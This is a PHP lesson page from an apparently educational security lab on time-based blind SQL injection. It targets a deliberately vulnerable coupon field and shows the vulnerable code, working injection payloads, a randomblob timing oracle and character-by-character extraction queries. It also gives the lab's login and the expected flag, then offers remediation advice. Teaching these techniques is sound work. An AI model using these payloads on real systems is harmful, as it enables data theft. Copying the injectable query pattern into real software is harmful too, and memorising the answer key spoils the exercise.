<?php
require __DIR__ . '/_layout.php';

$lessons = require_once __DIR__ . '/lessons.php';
$lesson  = $lessons['sqli-blind'];

academy_layout_start($lesson['title']);
?>

<header class="academy-lesson-head">
    <div class="academy-lesson-eyebrow"><?= htmlspecialchars($lesson['category']) ?> &middot; Lab 03</div>
    <h1><?= htmlspecialchars($lesson['title']) ?></h1>
    <div class="academy-lesson-meta">
        <span class="academy-badge is-hard"><?= htmlspecialchars($lesson['difficulty']) ?></span>
        <span class="academy-badge is-ready">Ready</span>
    </div>
</header>

<?php academy_render_related_labs('sqli-blind'); ?>

<!-- 1. THEORY -->
<section class="academy-block">
    <h2>1. Theory</h2>
    <p>
        <strong>Blind SQL injection</strong> is what you reach for when the server is still
        executing your injected SQL but is not echoing the result anywhere. Instead of
        reading data out of the response body, you ask the database yes/no questions and
        infer the answer from something <em>observable</em>: a different status code, a
        different response length, or - when nothing else is observable - how long the
        server takes to reply.
    </p>
    <p>
        With one yes/no probe per character per position in the alphabet, that single
        side channel is enough to extract any string from the database, one letter at a
        time.
    </p>
    <div class="academy-callout">
        <strong>Why this lab is on a separate database:</strong> the coupons live in
        <code>internal.db</code>, not <code>app.db</code>. UNION on
        <code>products.php</code> would not see them. The exfiltration target - the
        VIP coupon <code>encrypted_code</code> - only exists here.
    </div>
</section>

<!-- 2. TASK 1 - FIND A SINK AND CONFIRM IT IS BLIND -->
<section class="academy-block">
    <h2>2. Task 1 - find a sink and confirm it is blind</h2>
    <p>
        Browse the application and look for an input whose value is concatenated into a
        SQL query. A classic probe is a single quote (<code>'</code>): if the page now
        behaves differently from a benign input, the quote reached the parser.
        Then verify two more things:
    </p>
    <ul>
        <li>The response is the <em>same fixed string</em> whether the query returns a row
            or not - no row contents, no SQL error, no stack trace. That is what makes
            the sink &quot;blind&quot;: there is no content channel to read data from.</li>
        <li><code>UNION</code> is blocklisted (try <code>' UNION SELECT 1--</code>),
            so the usual exfiltration trick is off the table.</li>
    </ul>
    <details class="academy-hint">
        <summary>Reveal the blind sink</summary>
        <p>
            It is the <code>coupon_code</code> field on <code>cart.php</code>. The
            response is always one of three fixed strings - &quot;Coupon Applied!&quot;,
            &quot;Invalid Coupon Code.&quot;, or &quot;Security Alert: UNION keyword is
            forbidden!&quot; - and UNION is explicitly rejected:
        </p>
        <pre><code>// cart.php (coupon branch)
$code_input = $_POST['coupon_code'];

if (preg_match('/union/i', $code_input)) {
    $coupon_msg = "Security Alert: UNION keyword is forbidden!";
} else {
    $sql = "SELECT discount_val FROM CUPONS
             WHERE encrypted_code = '$code_input'"; // BLIND SQLi
    $res = $internal_db-&gt;query($sql);
    $coupon_msg = $res &amp;&amp; $res-&gt;fetchArray()
        ? "Coupon Applied!"
        : "Invalid Coupon Code.";
}</code></pre>
        <p>Three things make this exploitable:</p>
        <ol>
            <li>The input is concatenated straight into the SQL string - no prepared
                statement, no escaping.</li>
            <li>The blocklist only stops the keyword <code>UNION</code>. It does nothing
                about <code>CASE&nbsp;WHEN</code>, <code>SUBSTR</code>, or
                <code>randomblob</code>.</li>
            <li>The response leaks nothing useful, so the only side channel left is
                <strong>response time</strong>.</li>
        </ol>
    </details>
</section>

<!-- 3. TASK 2 - FIGURE OUT THE QUERY STRUCTURE AND BUILD A TIME ORACLE -->
<section class="academy-block">
    <h2>3. Task 2 - figure out the query structure and build a time oracle</h2>
    <p>
        Before you can extract anything you need two pieces of information:
    </p>
    <ol>
        <li>
            <strong>What is the injection context?</strong> Is your input inside single
            quotes? Double quotes? Naked? Try inputs like <code>x</code>,
            <code>x'</code>, <code>x' OR '1'='1</code>, <code>x' OR '1'='2</code> and
            <code>'</code> alone. The ones that successfully &quot;break out&quot; and
            re-close the string tell you the quote style. You also need to know how to
            <strong>comment out the rest</strong> of the original query (SQLite uses
            <code>--</code> with a trailing space).
        </li>
        <li>
            <strong>How do you make the server slow on demand?</strong> SQLite has no
            <code>SLEEP()</code>. You need a SQL-side trick that the optimizer cannot
            constant-fold and that only fires when your boolean question is true.
        </li>
    </ol>
    <details class="academy-hint">
        <summary>Reveal the injection context</summary>
        <p>
            The vulnerable query is
            <code>SELECT discount_val FROM CUPONS WHERE encrypted_code = '$code_input'</code>,
            so your input lands between two single quotes. The minimal payload that
            breaks out, injects a tautology, and comments away the trailing
            <code>'</code> is:
        </p>
        <pre><code>' OR '1'='1' --   &lt;-- &quot;Coupon Applied!&quot;
' OR '1'='2' --   &lt;-- &quot;Invalid Coupon Code.&quot;</code></pre>
        <p>
            Two different outcomes for two different conditions = the parser is honouring
            your injected SQL. Note SQLite&apos;s <code>--</code> comment <strong>needs a
            trailing space</strong> before the end of input.
        </p>
    </details>
    <details class="academy-hint">
        <summary>Reveal the time oracle</summary>
        <p>
            <code>randomblob(N)</code> allocates an <em>N</em>-byte blob of cryptographic
            random data. For <code>N = 250000000</code> (~250 MB) it takes several seconds
            and the optimizer can&apos;t skip it. Wrap it in <code>CASE WHEN</code> so it
            only runs when your boolean is true:
        </p>
        <pre><code>CASE WHEN (&lt;question&gt;) THEN randomblob(250000000) ELSE 1 END</code></pre>
        <p>
            Plugged into the injection context from above, your full probe is:
        </p>
        <pre><code>' OR (CASE WHEN (&lt;question&gt;) THEN randomblob(250000000) ELSE 1 END) -- </code></pre>
        <p>
            Last step: POST a benign coupon (<code>coupon_code=test</code>) a few times,
            take the average response time, that is your <strong>baseline</strong>.
            Any probe that takes longer than <code>baseline + 0.5s</code> is a YES.
        </p>
    </details>
</section>

<!-- 4. TASK 3 - LEAK THE VIP COUPON -->
<section class="academy-block">
    <h2>4. Task 3 - leak the VIP coupon</h2>
    <ol>
        <li>Discover the coupon table&apos;s name from <code>sqlite_master</code>, one
            character at a time, by asking
            <code>UPPER(SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1), pos, 1)) = '&lt;char&gt;'</code>.</li>
        <li>Once you know the table, walk the alphabet again against its
            <code>encrypted_code</code> column to leak the value, character by character.</li>
        <li>Stop when no character in the alphabet returns a YES at a given position -
            that is the end of the string.</li>
        <li>
            <strong>Goal:</strong> recover the VIP coupon string. On a freshly seeded DB
            the answer is <code>ANAN-VIP-2026</code>.
        </li>
    </ol>
    <p>
        You will need a valid <code>PHPSESSID</code> - the cart requires a logged-in
        user. Easiest is to register/login normally; you can also chain this lab on top
        of login-bypass SQLi.
    </p>
</section>

<!-- 5. START THE LAB -->
<section class="academy-block">
    <h2>5. Start the lab</h2>
    <p>The vulnerable cart page (with the coupon input) opens in a new tab. Log in
       first as <code>carlos</code> / <code>1234</code> if you are not already.</p>
    <a class="academy-lab-cta"
       href="<?= htmlspecialchars($lesson['target_url']) ?>"
       target="_blank" rel="noopener">Open vulnerable cart page</a>
</section>

<!-- 6. REVEAL SOLUTION -->
<details class="academy-solution" id="academy-solution">
    <summary>Reveal solution (spoilers!)</summary>
    <div class="academy-solution-body">
        <p class="academy-solution-warning">
            Try the lab on your own first. Reading the solution before attempting it
            yourself defeats the point of the exercise.
        </p>

        <h3>Step 1 - prove the sink is reachable</h3>
        <p>Send these three coupons, in order:</p>
        <pre><code>coupon_code=test            -&gt; Invalid Coupon Code.
coupon_code=' OR '1'='1' --  -&gt; Coupon Applied!
coupon_code=' OR '1'='2' --  -&gt; Invalid Coupon Code.</code></pre>
        <p>
            Two different boolean inputs produce two different fixed responses. That is
            the proof you have SQLi, and it tells you the injection context: your input
            is wrapped in single quotes, and <code>--&nbsp;</code> safely comments away
            the trailing <code>'</code>.
        </p>

        <h3>Step 2 - the time-based probe template</h3>
        <pre><code>POST /CyberProject/cart.php
Cookie: PHPSESSID=&lt;your session&gt;

coupon_code=' OR (CASE WHEN (&lt;condition&gt;)
                  THEN randomblob(250000000) ELSE 1 END) --
apply_coupon=1</code></pre>
        <p>
            If <code>&lt;condition&gt;</code> evaluates to true the server hangs for several
            seconds allocating that 250&nbsp;MB blob; if false, it returns almost instantly.
        </p>

        <h3>Step 3 - baseline</h3>
        <p>POST a benign coupon (<code>coupon_code=test</code>) and record how long the
            response takes. Anything more than <code>baseline + 0.5s</code> is treated as a
            YES.</p>

        <h3>Step 4 - discover the table name</h3>
        <p>
            For each character position, walk the alphabet and ask:
        </p>
        <pre><code>UPPER(SUBSTR(
   (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1),
   &lt;pos&gt;, 1
)) = '&lt;char&gt;'</code></pre>
        <p>
            The first time a query is slow, you have the letter at that position.
            <code>UPPER()</code> collapses case so the alphabet you have to scan is small.
            The first table happens to be <code>CUPONS</code>.
        </p>

        <h3>Step 5 - leak the secret</h3>
        <p>Same idea, but against the column you actually want:</p>
        <pre><code>UPPER(SUBSTR(
   (SELECT encrypted_code FROM CUPONS LIMIT 1),
   &lt;pos&gt;, 1
)) = '&lt;char&gt;'</code></pre>
        <p>
            Walk positions <code>1, 2, 3, ...</code> until no character matches - that is
            the end of the string. The full value is <code>ANAN-VIP-2026</code>.
        </p>

        <h3>Automated exploit</h3>
        <p>
            The script automates the baseline, the alphabet walk, table discovery, and the
            character-by-character data leak.
        </p>
        <div class="academy-script">
            <?php highlight_file(__DIR__ . '/../scripts/SQLi_Blind.py'); ?>
        </div>

        <h3>How to fix it (for context)</h3>
        <ul>
            <li>Replace concatenation with a prepared statement bound to
                <code>:code</code>. The <code>preg_match</code> blocklist is not a defence -
                it stops the obvious UNION but does nothing for time-based.</li>
            <li>Reject coupon codes that don&apos;t match a strict regex
                (<code>^[A-Z0-9-]{6,32}$</code>).</li>
            <li>Rate-limit the endpoint. The attack needs thousands of probes; even a
                modest delay per request makes it impractical.</li>
        </ul>
    </div>
</details>

<script>
(function () {
    var details = document.getElementById('academy-solution');
    if (!details) return;
    details.addEventListener('toggle', function () {
        if (this.open && !this.dataset.confirmed) {
            var ok = confirm('Are you sure you want to see the solution?\n\nTry the lab first - that is where the learning happens.');
            if (!ok) { this.open = false; } else { this.dataset.confirmed = '1'; }
        }
    });
})();
</script>

<p style="margin-top: 28px;">
    <a href="index.php">&larr; Back to all labs</a>
</p>

<?php
academy_layout_end();
